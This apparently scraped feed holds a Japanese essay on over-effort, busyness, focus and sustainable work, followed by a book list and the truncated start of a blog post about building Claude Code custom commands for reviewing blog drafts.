価値があるという等式を、疑うことなく信じていたのです。しかし冷静に考えるとおかしな話です。忙しいことと価値を生むことは別のことです。では、なぜ私たちは忙しくなるのでしょうか。理由はいくつかあります。優先順位がついていないから。断れないから。そして何より忙しさそのものを求めているからです。暇になることが怖い。何もしていない時間が耐えられない。だから予定を埋める。忙しくする。これは最初に述べた「頑張ることへの依存」と同じ構造です。意味のない努力忙しくしているうちに、私はたくさんの意味のない努力をしていました。完璧な資料を作るために、美しいデザイン、詳細な分析、見栄えの良いグラフを何日もかけて作ります。しかし実際に見られるのは最初の数ページだけです。定期的な報告のために資料を作って説明して質疑応答する時間を、毎週毎月確保しています。しかしその時間で議論される内容はメール一通で済む内容だったりします。これは全て、「頑張っている感」を得るための努力でした。実際に価値を生むための努力ではなく、自分と周囲に「頑張っている」と思わせるための努力だったのです。なぜこんなことをしていたのでしょうか。「頑張っていない自分」が怖かったからです。「何もしていない」と認めることが怖かったから、何かをしている「ふり」をしたのです。しかしそのせいで、意味のあることをする時間がなくなってしまいました。意味のない努力が、意味のある努力を駆逐していたのです。なぜ意味のない努力を選んでしまうのかこれは努力の世界における残酷な法則です。なぜ残酷かというと、意味のない努力の方が楽で、見た目の成果が出やすいからです。比較してみましょう。完璧な資料を作ることは無理ですが、時間をかければ見栄えはかなり良くなります。しかし複雑な問題を本質的に解決することは難しく、時間をかけてもできるとは限りません。会議に出席することは簡単です。座って話を聞いてたまに発言すればいい。しかし深く考えて独創的な解決策を生み出すことは難しく、孤独で不確実で失敗するだろう。だから人は無意識に意味のない努力を選びます。一日の大半を意味のない努力で埋めてしまうため、本質的な努力をする時間がなくなってしまうのです。楽な努力が、本当の努力を駆逐する。何もしない時間の価値この悪循環を断ち切るために、ある日、試しに一日何もしない時間を作ってみました。会議もキャンセルし、メールも見ずに、ただ窓の外を眺める時間を確保しました。最初は不安でした。「こんなことしていていいのか」「時間を無駄にしているのではないか」と。この不安は、最初に述べた「何もしていない自分に価値がない」という信念から来ています。しかし一時間、二時間と過ごすうちに何かが変わりました。頭の中がクリアになって、今まで見えなかったものが見えるようになったのです。忙しさは、思考を停止させます。忙しい状態では「これって意味あるのか」と問う余裕がないため、意味のないことを延々と続けてしまうのです。そのとき、ふと考えました。何も生み出していない時間や、誰からも評価されない時間にさえ、私の人生の価値は宿りうるのだろうか。窓の外を眺めているだけの時間。何も「生産」していない時間。誰にも見られていない時間。そういう時間に、価値はあるのでしょうか。最初、私は「いいえ」と答えていました。価値とは、何かを生み出すことで生まれるものだと思っていたからです。成果があってこそ価値がある。評価されてこそ価値がある。そう信じていました。しかし、何もしない時間を過ごしているうちに、考えが変わってきました。その時間は、確かに何も「生産」していませんでした。でも、自分の中で何かが整理され、何かが癒され、何かが育っていたのです。それは目に見える成果ではありませんでしたが、確かに何かが起きていました。生産性や成果や他者評価——そういったものを全部はがした後に残るもの。それが「自分の時間」の価値なのだろう。何かを生み出すための時間ではなく、ただ存在するための時間。そういう時間があっていいのだと、少しずつ思えるようになりました。忙しさという霧が晴れて本質が見えたとき、気づきました。今までやっていたことの半分以上は実は必要なく、頑張っていたけれど価値を生んでいなかったのです。立ち止まった時間が、一番遠くまで連れて行ってくれた。選択という技術何もしない時間を作ったことで、30歳になって学んだ最も重要なことの1つが見えてきました。それは、選択することの重要性です。若い頃は「全部やろう」としていました。新しい技術が出れば学び、新しいプロジェクトがあれば参加し、頼まれた仕事は全て引き受けていました。確かに、若い頃や自分の成長を誰かが見守ってくれる時期には、それも良いだろう。がむしゃらに量をこなすことで、見えてくるものはあります。しかしそれだけではありません。自分の能力を発揮できる環境を自分で選び、作ることもまた、自分の能力なのです。全部やろうとし続けると、何が起きるでしょうか。エネルギーが分散してどれも中途半端になり、重要なことに十分な時間と集中を注げなくなります。そして何より、自分が得意なこと、やりたいことが見えなくなってしまいます。若い頃からやりすぎると、自分の可能性を狭めてしまう可能性があるのです。すべてに手を出すことで、「自分は何でもそこそこできる人」にはなれるだろう。しかし「この領域では誰にも負けない」という強みは育ちません。ある時、尊敬する先輩に「どうやったら全部うまくできますか」と相談しました。彼は笑って「全部うまくやろうとするな。1つだけ、圧倒的にうまくやれ」と言いました。「勝てる領域を見つけろ」と彼は続けました。「君が他の誰よりも価値を出せる領域、そこに全てを賭けろ。他は最低限でいい」と。集中することで見えてきたものその日から自分の「勝てる領域」を探し始めました。自分は何が得意なのか、どこで他の人と差別化できるのか。振り返ってみると、私が価値を生んでいたのは、複雑な問題を構造化してシンプルな解決策を示すことでした。資料を何百枚作ることでも、会議を何時間することでもありませんでした。でも当時の私は、そのことに気づいていませんでした。すべてを同じように頑張っていたからです。得意なことと苦手なこと、重要なことと些細なこと、すべてに同じエネルギーを注いでいました。それからは、「勝てる領域」へ集中することにしました。複雑な問題に向き合う時間を最大化し、他の作業を最小化しました。すると不思議なことが起きました。仕事の質が上がり、周囲の評価も上がり、そして忙しさは減ったのです。やることを減らしたのに、成果は増えた。これは最初、信じられませんでした。でも考えてみれば当然のことでした。苦手なことに時間を使っていた分を、得意なことに回しただけなのです。同じ時間を使っても、得意なことの方が成果は出ます。これは怠けているわけではありません。戦略的に力を配分しているだけなのです。やめることを選ぶ選択するということは何かを捨てることです。これが最も難しいことでした。私たちは何かを捨てることに恐怖を感じます。「後で必要になるだろう」「チャンスを逃すだろう」と考えてしまいます。しかし、「やらないこと」を選ぶ決断こそが、人生における優先順位を明確化する鍵なのです。ここでもう一度、選択の影について考えてみます。私は「何を選ぶか」については意識していましたが、「何を選ばずに残してしまっているか」については、ほとんど意識していませんでした。やめることを選ぶとき、私たちは選んだこと（やめること）に意識を向けます。しかし同時に、「続けること」を選んでいるのです。その「続けること」は、続ける価値があるものでしょうか。無意識のうちに惰性で続けているだけではないでしょうか。私は「To Stopリスト」を作り始めました。やることリストではなく、やめることリストです。意味のない定例会議に出席するのをやめました。完璧な資料を作るのをやめました。すべての技術トレンドを追うのをやめました。頼まれた仕事を全て引き受けるのをやめました。忙しいふりをするのもやめました。最初は罪悪感がありました。しかしやめてみると驚きました。誰も困らなかったのです。むしろ重要なことへ集中できるようになって、成果が上がりました。やめることと怠けることは違います。それは本質に集中するための戦略なのです。捨てることが、得ることの始まりだった。努力はベクトルだここまで読んで、頑張ること自体が悪いのだと思われただろう。しかし、そうではありません。問題は「どう頑張るか」なのです。頑張ることは、ベクトルです。大きさだけじゃなく、方向があるのです。どれだけ大きな力で頑張っても、方向が間違っていたら目的地には着きません。むしろ遠ざかっていくのです。多くの人はベクトルの「大きさ」ばかりに注目します。「もっと頑張る」「もっと努力する」「もっと時間をかける」と考え、方向については考えません。しかし重要なのは方向です。間違った方向に全力で走るより、正しい方向にゆっくり歩く方が、目的地には早く着くのです。そして、その「方向」を決めるとき、また同じところに戻ってきます。「前に進む」とは、いったい誰の物差しで測られる「進歩」なのか。社会が示す方向に進むことが「前」なのか。それとも、自分が心から望む方向に進むことが「前」なのか。そこに答えを出さないまま、ベクトルの大きさだけを増やしても、どこにも到達けないのです。努力と評価のミスマッチ努力の方向が間違っていると、どうなるでしょうか。努力と評価が一致しない場所で頑張り続けることになります。それは、尋常ではないほど辛いものです。やっても認められない。いくら頑張っても成果として認識されない。「こんなに頑張っているのになぜ評価されないんだろう」という疑問は、やがて「自分には才能がないのだろう」という絶望に変わっていきます。しかし、ここで立ち止まって考えてみましょう。問題は才能ではなく、環境とのミスマッチなのだろう。あなたの能力が発揮されない環境。あなたの強みが評価されない組織。あなたの価値が認識されない役割。そういう場所でどれだけ頑張っても報われません。これは残酷な事実ですが、同時に希望でもあります。なぜなら、環境は変えられるからです。才能がないのではなく、場所が合っていないだけなら、場所を変えれば状況は改善する可能性があるのです。能力とは環境との相互作用ここで、根本的な認識を改める必要があります。「能力」とは、環境との相互作用の中で初めて発揮されるものなのです。ある環境では高いパフォーマンスを出せる人が、別の環境では全く力を発揮できない。珍しいことではありません。むしろ普通のことです。私自身、この事実を身をもって経験しました。ある組織でやりたくない仕事を頑張り、長時間働いて必死に努力しました。しかし成果は出ず、評価も上がらず、自己肯定感は下がり続けて、「自分は仕事ができない」と思っていました。しかし環境を変えた瞬間、すべてが変わったのです。同じ私が違う組織、違う役割で働き始めると、成果が出て評価され、自己肯定感が戻ってきました。私の「能力」は変わっていませんでした。変わったのは環境だったのです。ですから「自分には能力がない」という結論は早計です。正確には「この環境では、自分の能力が発揮されない」ということなのです。この認識は重要です。なぜなら、「能力がない」という結論は絶望につながりますが、「環境が合っていない」という認識は行動につながるからです。頑張りで全てを説明しようとしていた私は長い間、すべてを「頑張り」で説明していました。環境のことなど、考えもしませんでした。成果が出ない時は「自分がもっと頑張ればよい」と思っていました。だから、もっと時間をかけ、もっと努力し、もっと自分を追い込みました。成果が出た時は「自分が頑張ったから」と思っていました。だから、次も同じように頑張れば、同じように成果が出ると信じていました。うまくいかないのは環境のせいではなく、自分の努力が足りないせい。うまくいったのは環境のおかげではなく、自分の努力のおかげ。すべての原因を「自分の頑張り」に帰属させていたのです。この考え方は、一見すると責任感があるように見えます。「環境のせいにしない」「自分でコントロールできることに集中する」。でも、実際にはこれは視野の狭さでした。なぜなら、同じ努力をしても、環境によって成果は大きく変わるからです。自分の強みが発揮される環境なら、少ない努力で大きな成果が出ます。自分の強みが発揮されない環境なら、どれだけ努力しても成果は限られます。そしてもう1つ、認識しておくべきことがあります。「自分の能力が発揮されない環境」は、常に存在しているということです。どんな組織にも、どんな役割にも、自分に合わない部分があります。完璧にフィットする環境など存在しません。大切なのは、それを認めることです。「ここは自分に合っていない」と認めることは、敗北ではありません。むしろ、そこから戦略が始まります。合わない部分を認めるからこそ、「ではどうするか」を考えられるようになるのです。私は長い間、合わない部分を認めることができませんでした。「もっと頑張れば何とかなる」と思い続けていました。でも実際には、何ともならなかったのです。ただ消耗しただけでした。この事実に気づくまで、私は長い時間を要しました。そして気づいた時、ようやく「どこで頑張るか」を考えられるようになったのです。勝てる領域を見つけるでは、どうすれば「勝てる領域」を見つけられるのでしょうか。これはあくまで私の場合の話ですが、無意味な場所で頑張らず、能力が発揮される場所で努力することが、私が燃え尽きずに長く走り続ける秘訣でした。私は、自分にとって意味の分からない仕事を無限にできる耐久性の高い人間ではありませんでした。合わない環境で合わない仕事を続けることは苦痛でしかありませんでした。それは弱さだろうが、それが私の現実だったのです。私の場合、開発全般が得意でした。設計と開発、どちらも能力を発揮できて楽しいのです。しかしやってはいけなかったのは、マルチタスクをしながら人との調整やステークホルダー管理を大量にこなすことでした。この能力が著しく低く、全体の生産性がとても下がってしまったのです。最初は周囲の期待に応えようとして、開発をしながら調整業務もこなそうとしました。しかし評価されませんでした。「中途半端だ」と言ってもらえればまだ良かった。そうではなく、評価が低いだけ。何が問題なのか分からないまま、成果の出ない日々が続きました。しかしある程度裁量をもらい、開発に集中し始めたら状況が変わりました。「この実装すごく良い」と言われるようになって、チーム全体の生産性が上がり、そして私の評価も上がったのです。勝てる領域とは、自分の能力と環境のニーズが交わる場所です。自分が得意でも誰も必要としていなければ評価されず、環境が必要としていても自分ができなければ価値を出せません。その交点を見つけてそこに集中すること、それが努力の方向性を正しく定める方法でした。戦う場所を選ぶことが、戦い方を決める。環境という見えない制約ここまで読んで、あなたはこう考えるだろう。「確かに正しい場所で頑張ることは重要だけれど、そもそも『自分の能力が発揮される環境』なんて、どうやって見つければいいのか」と。その通りです。自分の能力が発揮される環境は簡単には見つかりません。そしてもっと現実的な問題があります。今いる環境が自分に合っていないと分かっても、すぐには動けないのです。住宅ローンがある。家族を養っている。転職するには経験が足りない。業界の状況が悪い。様々な制約が私たちを今の場所に縛り付けています。だから、戦術的な頑張りも必要なのです。これは矛盾しているように聞こえるだろう。今まで「頑張りすぎるな」と言ってきたのに、「頑張りも必要」と言うのは。しかし、これは矛盾ではありません。問題は「頑張ること」自体ではなく、「考えずに頑張ること」だったのです。戦略を持った上での戦術的な頑張りは、必要なものです。持続可能性という解答ここまで、頑張ることの問題点と、選択と集中の重要性を述べてきました。では、具体的にどうすればいいのでしょうか。私が見つけた答えは、持続可能性でした。面白いことに気づきました。頑張る量を減らしたら、成果が増えたのです。ある時、私は思い切って変えてみることにしました。やるべき仕事とやらない仕事を分けて、不要なミーティングに出なくなりました。やりたくない仕事を整理させてほしいと相談したのです。すると不思議なことが起きました。勤務中の8時間の質が劇的に上がったのです。なぜこうなったのか。理由は単純でした。「この8時間だけが自分の時間だ」と考えると一瞬たりとも無駄にできなくなり、集中力が持続して疲労が少なくなり、翌日もまた集中できるようになったのです。無駄な時間が減りましたが、学びの質は上がりました。必要なことだけを学ぶようになり、「やらなきゃ」ではなく「やりたい」で動くようになったのです。この経験から1つの原則を学びました。持続可能性が、成果を生むという原則です。一時的には全ての時間を注ぎ込む方が多く成果を出せるように見えます。しかし長期的には持続可能なペースの方がずっと多くの成果を生むのです。無理をして一気にやろうとすると、どこかで必ず破綻します。体調を崩すか、質が落ちるか、燃え尽きるか。そして破綻した後のリカバリーには、節約できたはずの時間よりもずっと長い時間がかかるのです。新しいやり方の始まり持続可能性を意識することで、新しいやり方が始まりました。無理をしない働き方。自分の限界を知った上でのアプローチ。がむしゃらではなく戦略的なやり方。私の新しいやり方は、「頑張ります」という言葉を封印することから始まりました。最初は怖かったのを覚えています。「頑張らない」と言ったら「やる気がない」と思われるんじゃないか、評価が下がるんじゃないかと心配していました。しかし違ったのです。「頑張ります」をやめて「こうします」と言い始めた時、初めて信頼されるようになりました。具体的な計画を示す。達成可能な目標を設定する。リスクを評価する。代替案を用意する。そして結果を出す。がむしゃらな熱意ではなく冷静な戦略で勝負するやり方に変えたのです。頑張ることをやめたら時間ができました。その時間で考えることができました。「今の仕事は本当に自分がやりたいことなのか」「この関係性は本当に大切にしたいものなのか」「この努力は本当に価値を生んでいるのか」と。そして気づきました。今まで「頑張らなきゃ」と思ってやっていたことの多くは、実は自分が本当にやりたいことではなかったのです。社会的な期待に応えるため、周囲に認められるため、「できる人」に見られるため、そういう外的な動機で動いていたのです。しかし30歳になって、もうそういう生き方は続けられないと悟りました。体力的な限界、精神的な限界、そして何より残りの人生をそんな生き方で使いたくないと思ったのです。がむしゃらで許された特別な時間の終わりは、敗北ではありません。より賢く、より持続可能なやり方への転換点なのです。自己犠牲という承認への飢え新しいやり方を始めてから、もう1つ重要なことに気づきました。それは、自分を大切にすることと他者を大切にすることのバランスについてです。「他人を優先する自分」でしか価値を感じられない人がいます。自分のニーズを無視して他人に尽くすことで「必要とされている感覚」を得ているのです。一見すると優しさに見えます。しかし、実はこれは承認への飢えなのです。自分の時間を全て他人に捧げる。自分の希望を後回しにする。常に誰かの期待に応える。自分が疲れていても「頼まれたから」と引き受ける。その自己犠牲によって「自分は良い人だ」「自分は必要とされている」と感じているのです。しかし、健全ではありません。自分を大切にできない人は、結局他人を大切にできないからです。見返りを期待する優しさなぜ自己犠牲が健全でないのか、もう少し詳しく説明させてください。自分を犠牲にして他人に尽くすと、無意識のうちに「見返り」を期待するようになるのです。「こんなに頑張ったんだから感謝されるべきだ」「こんなに尽くしたんだから認められるべきだ」という気持ちが湧いてきます。そしてその期待が満たされないと怒りや不満が生まれます。「こんなに頑張ったのに」「こんなに尽くしたのに」と相手を責める気持ちが湧いてきます。これは優しさとは違います。相手のためではなく自分の承認欲求を満たすための行為なのです。見返りを期待しない優しさもあります。相手のために行動し、その結果がどうであれ満足できる。私はそういう優しさを持ちたいと思いました。しかし自分が満たされていない状態では、その無条件の優しさを持つことは難しいのです。まず自分を満たすことだからこそ、まず自分を満たすことが大切なのです。これは理屈としては分かりやすい話です。でも、実行するのは難しいのです。なぜなら、自分を後回しにすることが習慣になっているからです。私の場合、常に誰かのために動いていました。チームのため、会社のため、プロジェクトのため。そう言えば聞こえは良いのですが、実際には自分のことを考える余裕がなかっただけでした。そしてある時、限界が来ました。誰かのために動く気力すら湧かなくなったのです。その時ようやく気づきました。自分が枯れていたら、誰かに何かを与えることはできないのだと。自分を大切にすることは、自己中心的なことではありません。持続可能に誰かを助けるための前提条件なのです。自分の限界を知る。自分のニーズを尊重する。時には「できない」と言う勇気を持つ。これは全て、より長く、より健全に他者を大切にするための準備なのです。そして自分が満たされた状態から他人を助ける。見返りを期待せず純粋に相手のために行動する。私はそういう優しさを持ちたいのです。空っぽの器からは、何も注げない。フェーズによる変化しかしここでも1つ大切なことを付け加えます。キャリアのフェーズによって、求められることは変わるということです。ジュニアの頃は、がむしゃらでも許されました。むしろ、がむしゃらであることが求められていました。何も分からないのだから、とにかく量をこなせ。失敗してもいいから、手を動かせ。その時期に「効率」や「戦略」を語るのは早すぎたのです。しかしミドルになると、状況が変わります。「頑張っています」だけでは評価されなくなります。「で、結果は」「で、何を学んだの」と問われるようになります。がむしゃらに動くだけでなく、方向性を持って動くことが求められるのです。そしてシニアになると、より変わります。自分が頑張ることよりも、チーム全体の成果が問われます。自分一人で抱え込むのではなく、任せることが求められます。「自分が頑張る」から「みんなが頑張れる環境を作る」へ。役割が変わるのです。私は今、ミドルからシニアへの過渡期にいます。ジュニアの頃のやり方が通用しなくなり、新しいやり方を模索している時期です。また同じことを考えます。今、手放せずに握りしめている「頑張り」は、本当に自分を守っているのだろうか。それとも、もう要らなくなった古い防具なのだろうか。ジュニアの頃、「とにかく頑張る」という姿勢は私を守ってくれました。何も分からなくても、がむしゃらにやっていれば居場所がありました。しかし今、同じ姿勢を続けることは、私を守るどころか、足を引っ張っています。かつて自分を守ってくれた「頑張り方」が、フェーズが変わった今もまだ有効なのか。それとも、アップデートすべきなのか。そこに正直に向き合う必要がありました。重要なのは、今の自分がどのフェーズにいるかを認識することであり、そのフェーズに応じたやり方を選ぶことです。ジュニアのやり方をミドルになっても続けていたら、消耗するだけです。ミドルのやり方をシニアになっても続けていたら、チームの足を引っ張ります。フェーズが変われば、やり方も変えなければならないのです。この文章で私が伝えたいのは「頑張るな」ということではありません。「今の自分のフェーズに合った頑張り方を選べ」ということなのです。しかし、1つ補足があります。自分では気づけなくても、上司やマネージャーが適切にコントロールしてくれている場合があるということです。私の場合も、振り返ってみれば、良い上司に恵まれていた時期は自然と適切な仕事量に調整されていました。「それは引き受けなくていい」「今はこっちに集中して」と言ってもらえていたのです。当時は気づいていませんでしたが、それは上司が私の状態を見て、適切に仕事を配分してくれていたからでした。逆に言えば、自分が上司やチームリーダーになった時には、同じことをする責任があるということです。メンバーが頑張りすぎていないか。中途半端になっていないか。「頑張っているように見える」からといって見逃していないか。そして、必要であれば「それはやらなくていい」と言えているか。人は頑張っている人に「中途半端だ」とは言いにくいものです。だからこそ、上司やリーダーは意識的にそれを言う必要があります。言わなければ、かつての私のように、本人は気づかないまま消耗していくのです。「おい、がんばるな」と言ってあげられる人になること。それもまた、フェーズが変わった時に求められる役割なのです。「頑張る自分」というアイデンティティ最後に、最も根深い問題について話させてください。私は「頑張る自分」というアイデンティティに縛られていました。「私は頑張る人だ」「私は努力家だ」「私は諦めない」というような自己像があり、その自己像を守るために頑張り続けなければいけなかったのです。しかしそれは苦しいものでした。「頑張る自分」であり続けるために休めず、立ち止まれず、弱音を吐けなかったのです。「頑張る自分」というアイデンティティが自分を縛る檻になっていました。ある日ふと気づきました。私は「頑張る」ということ自体にしがみついていて、成果を出すためではなく「頑張る自分」でいるために頑張っていたのです。そしてまた、同じところに戻ってきます。「頑張らなければ価値がない自分」と、「頑張っていなくてもここにいていい自分」のどちらを、本当は生きたいのか。頭で考えれば、答えは明らかです。「頑張っていなくても価値がある」と信じたい。でも、心の奥底では、まだその確信が持てませんでした。しかし、考え続けることで、少しずつ変わってきました。そしてもう1つ気づきました。頑張っていなくても自分に価値があるということに。成果を出していなくても自分に価値がある。忙しくなくても自分に価値がある。価値は頑張ることから来るのではなく、存在することそのものに価値があるのです。これは宗教的な話ではなく実際的な話です。頑張り続けて壊れた人をたくさん見てきました。優秀な人ほど「もっとできるはずだ」と自分を追い込んで限界を超えて壊れてしまいます。そして壊れたら何も生み出せなくなってしまいます。何も生み出していない時間にも、価値はあります。誰からも評価されない時間にも、意味があります。生産性という物差しを外した時、初めて見えてくるものがあるのです。だから頑張らないことは自分を守ることであり、長く続けるための戦略なのです。全力で走り続けることはできません。どこかで必ず止まります。でも、適切なペースで歩き続けることはできます。そして、歩き続けた人の方が、結果的には遠くまで行けるのです。「頑張る自分」を降りて「続けられる自分」になり、そして「結果を出す自分」に登る。それが私の選択でした。おわりにこの文章を書き終えて、コーヒーを淹れた。カップを持って窓際に立つと、隣のマンションの明かりがいくつか見える。日曜日の夜だ。明日からまた一週間が始まる。みんな、何をしているんだろう。仕事の準備をしているのか、録画していたドラマを見ているのか、あるいは私と同じように、何となく窓の外を眺めているのか。正直に言うと、この文章を書いたからといって、私が何か変わったわけではない。明日になれば、また同じように仕事に行く。締め切りに追われて、会議に出て、メールを返して、「頑張らなきゃ」と思う瞬間がきっとある。そういう自分を完全になくすことはできない。たぶん、これからもずっと。でも、一つだけ変わったことがある。「頑張っている」と言われたとき、その言葉をそのまま受け取らなくなった。「で、それで何か変わったの？」と自分に聞くようになった。頑張っていることを、言い訳にしなくなった。それだけのことだ。たったそれだけのことなのに、少しだけ楽になった。頑張っていない自分を許せるようになった、というのとは違う。頑張ることの価値を、正しく測れるようになった、という感じだ。この文章を読んで、何か得るものがあったかどうかは分からない。「そんなの当たり前じゃん」と思った人もいるだろうし、「何を言っているのか分からない」と思った人もいるだろう。それでいい。ただ、もし今、頑張っているのに上手くいかなくて苦しい人がいたら。もし今、頑張れない自分を責めている人がいたら。一つだけ伝えたいことがある。頑張っていることは、偉いことじゃない。偉いのは、頑張った結果、何かが変わることだ。何かを生み出すことだ。誰かの役に立つことだ。頑張ること自体には、実は何の価値もない。でも逆に言えば、頑張らなくても、結果を出せばいいということでもある。頑張らなくても、変われればいいということでもある。頑張らなくても、前に進めればいいということでもある。だから、頑張らなくていい。本当に、頑張らなくていい。その代わり、歩くのはやめないでほしい。自分のペースで、自分の方向に、自分の足で。転んでもいい。休んでもいい。立ち止まってもいい。でも、歩くのだけは、やめないでほしい。コーヒーが冷めてきた。明日も、たぶん、いつも通りの一日が来る。でも、いつも通りの一日の中で、少しだけ違う選択ができるかもしれない。「頑張らなきゃ」と思ったとき、「いや、待て」と立ち止まれるかもしれない。それだけで、十分だと思う。おい、がんばるな。syu-m-5151.hatenablog.com参考書籍あっという間に人は死ぬから　「時間を食べつくすモンスター」の正体と倒し方作者:佐藤 舞（サトマイ）KADOKAWAAmazon不完全主義　限りある人生を上手に過ごす方法作者:オリバー・バークマンかんき出版Amazonエッセンシャル思考 最少の時間で成果を最大にする作者:グレッグ・マキューンかんき出版Amazonエフォートレス思考 努力を最小化して成果を最大化する作者:グレッグ・マキューンかんき出版Amazonさあ、才能(じぶん)に目覚めよう　最新版 ストレングス・ファインダー2.0作者:ジム・クリフトン,ギャラップ日経BPAmazon嫌われる勇気作者:岸見 一郎,古賀 史健ダイヤモンド社Amazon幸せになる勇気作者:岸見 一郎,古賀 史健ダイヤモンド社AmazonDIE WITH ZERO　人生が豊かになりすぎる究極のルール作者:ビル・パーキンスダイヤモンド社Amazon部下をもったらいちばん最初に読む本作者:橋本拓也アチーブメント出版Amazon","isoDate":"2025-12-02T03:47:02.000Z","dateMiliSeconds":1764647222000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"生成AIエージェントによるブログレビュー環境の構築（上）","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/02/002601","contentSnippet":"この記事は、3-shake Advent Calendar 2025 2日目のエントリ記事です。はじめにブログを書いては直し、また直す。同じ文章を何度も触っていると、客観的な判断ができなくなってくる。「これで本当に伝わるのか？」という疑問だけが残る。コードにはレビューがあり、デザインには批評がある。しかし、技術ブログには明確な基準がない。その不安を解消するために、最初は自分の文章を評価する「プロンプト」を作って運用していた。防御力、思考整理力、実践応用性など、6つの観点でAIに評価させるのだ。だが、すぐに問題にぶつかった。「面倒」なのだ。記事を書くたびにプロンプトを開き、貼り付け、結果を待つ。この手動のひと手間があるだけで、次第に「今日はまあいいか」とサボるようになり、せっかくの基準も形骸化していった。だから、環境ごと変えることにした。生成AIのエージェント機能を使い、ブログレビューの手順をひとつの動作にまとめたのだ。/blog-quality-review と打てば、必要なチェックが勝手に走る。手間を消し、継続性だけを残す。今回は、そんなブログレビュー環境の構築について紹介する。syu-m-5151.hatenablog.comブログ記事評価プロンプト v2.1 https://syu-m-5151.hatenablog.com/entry/2025/05/19/100659 \xb7 GitHubこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、はじめていきます。なぜブログレビューにエージェントを使うのか自分で書いた記事を自分で評価するのは、想像以上に難しい。「こんなにわかりやすく書いたのに、なぜ伝わらないんだろう」と思うことはないだろうか。それは私たちが、自分の持つ知識や前提条件を、無意識に読者にも期待してしまうからだ。「これくらい知っているだろう」「説明不要だろう」という思い込みが、読者との間に溝を作る。ここにエージェントが入ると、話が変わる。エージェントは私の「暗黙の前提」を共有していない。だから、初学者が感じるであろう「分からない」を冷静に指摘できる。専門用語の壁、論理の飛躍、「なぜ？」という素朴な疑問——これらを容赦なく洗い出してくれる。さらに、エージェントは疲れないし、基準を忘れない。私が定義した「レビューの観点」を一貫して適用し続ける。これは単なる自動化ではない。私の認知リソースを、「本当に人間にしかできない判断」に集中させるための仕組みだ。Commandsでレビュー観点を構造化するClaude Codeには、よく使うプロンプトをコマンド化できる機能がある。.claude/commands/ ディレクトリにMarkdownファイルを置くだけで、ファイル名がコマンド名になり、中身がプロンプトとして機能する。code.claude.com「毎回『この観点でレビューして』と指示するのは面倒」「記事ごとにレビューの質がバラつくのが嫌だ」そんな悩みを抱えていた私にとって、Commandsは最適解だった。一貫性の担保手打ちのプロンプトでは、表現の揺らぎによりAIの回答も変わってしまう。Commandsなら常に同一の定義で実行されるため、出力の質が安定する。# 悪い例（毎回微妙に違う）「この記事をレビューして」「読みやすさをチェック」「AIっぽくないか見て」# 良い例（カスタムコマンド）/blog-quality-review blog.md# → 常に定義された6つの観点・同じ基準でレビューが走るGitでのVersion管理Commandsの実体はMarkdownファイルだ。つまり、プロンプトの改善履歴をGitで管理できる。「この観点を追加したら、指摘が鋭くなった」「この表現を変えたら、より具体的な改善案が出るようになった」こういった試行錯誤の軌跡が残ることで、プロンプト自体が「育つ資産」になっていく。私が実際に使っているCommandsここからは、私がブログ執筆・レビューで実際に使用しているCommandsを全てではないが紹介する。注意：ここで紹介するのは各Commandの要点のみだ。実際のファイルには、より詳細な指示や評価基準（Few-Shotなど）が含まれている。Phase 1: 書く前に深く考える良いブログは「書く」前に「考える」ことから始まる。/deep-thinking-prompt - 深い思考のための問いかけ# Deep Thinking Prompt - 深く考えるための問いかけブログを書く前に「深く考える」ための問いかけを提供します。表面的な理解や一般論で終わらず、本質に迫るための思考支援ツールです。## 7つの問いかけ1. **原体験への問いかけ** - なぜこのテーマに興味を持ったのか2. **前提への問いかけ** - 当たり前だと思っていることは何か3. **対立への問いかけ** - 矛盾や葛藤はどこにあるか4. **構造への問いかけ** - システムとしてどう機能しているか5. **変化への問いかけ** - 過去と現在で何が変わったか6. **未来への問いかけ** - このまま進むとどうなるか7. **読者への問いかけ** - 誰に届けたいのか、なぜその人なのかこのCommandを使うと、「何を書くか（What）」だけでなく「なぜ書くのか（Why）」が明確になる。一般論ではなく、自分だけの視点を掘り起こすための工程だ。/structural-thinking - 構造設計# Structural Thinking - 構造的思考支援散らばった思考を整理し、論理的な流れを作ります。読者の理解プロセスに合わせた「伝わる」構成を設計します。深く考えたあと、その思考をどう配置するか。このCommandが、散乱したアイデアを読者に届く「ストーリー」へと整えてくれる。Phase 2: 書いた後にレビューする/blog-quality-review - 6つの観点でレビュー以前作成した「ブログ記事評価プロンプト」をCommand化したものだ。# Blog Quality Review - ブログ品質レビュー以下の6つの観点（各0.0-5.0スコア）で評価します：1. **防御力** - 批判や反論への耐性2. **思考整理力** - 情報の論理的構造化3. **実践応用性** - 読者が行動に移せる価値4. **構成と読みやすさ** - 視覚的要素と文体5. **コミュニケーション力** - 人間味のある伝達6. **人間らしさ** - 温度感と個性実行すると記事の強みと弱みが数値化される。「前回は実践応用性が3.2だったが、今回は4.0に上がった」といった具合に、自身の成長や記事の品質を定量的に把握できる。/beginner-feedback - 初学者の視点# Beginner Feedback - 初学者の素朴な意見あなたは**一般読者代表（佐々木ゆい・28歳）**として、素朴な意見を提供します。- 専門用語や前提知識の壁を発見- 論理の飛躍を指摘- 「なぜ？」という素朴な疑問を投げかける- 一般読者が共感できるか確認エキスパートの目では見逃してしまう、初学者の「分からない」を発見するためのCommandだ。具体的なペルソナを設定することで、フィードバックの解像度を高めている。/ai-humanity-check - AIっぽさの評価# ai-humanity-check文章のAIっぽさを評価し、より人間らしい表現への改善提案を行います。## AIっぽさスコア (0.0-5.0) ※低いほど人間らしい**0.0-1.0 (完全に人間的)**- 著者特有の言い回しや癖がある- 具体的な失敗談や苦労話が生々しい- 感情の起伏が自然で共感できるAIに下書きを支援させると、どうしても文章が「AI臭く」なりがちだ。このCommandで機械的な表現を検出し、体温のある文章へと戻していく。Phase 3: 仕上げる/textlint-polish - 文章校正# Textlint Polish - 文章校正・AIっぽさ除去機械的・AIっぽい表現を排除し、自然で読みやすい文章にする。- AIが多用する冗長表現を検出- 比喩的・詩的すぎる表現を簡潔に- 文体の統一（です・ます調）textlint的な観点で、表現の誤りや揺らぎを修正する。AI特有の冗長な言い回しもここでカットする。/redundancy-check - 冗長性チェック# Redundancy Check - 冗長性チェック以下の4つの観点（各0.0-5.0スコア）で評価します：1. **情報密度** - 1文あたりの情報量2. **簡潔性** - 冗長表現・無駄な修飾の少なさ3. **論理効率** - 論理的重複・循環論法の少なさ4. **構造最適性** - 